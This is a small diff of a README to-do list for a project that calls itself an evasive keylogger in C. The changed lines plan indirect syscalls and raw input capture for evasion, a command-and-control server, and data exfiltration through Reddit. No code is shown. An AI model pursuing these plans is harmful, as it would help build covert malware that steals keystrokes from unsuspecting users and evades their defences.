@@ -11,7 +11,7 @@ A keylogger written in C that has evasion in mind
 
 ### To-do
 
-- The parts of main.c that need work have been marked with TO-DO. 
+- Use NtGetRawInputData. Implement indirect syscalls.
 - Create a C2 which will process the data
 - Data exfil through:
   - Reddit
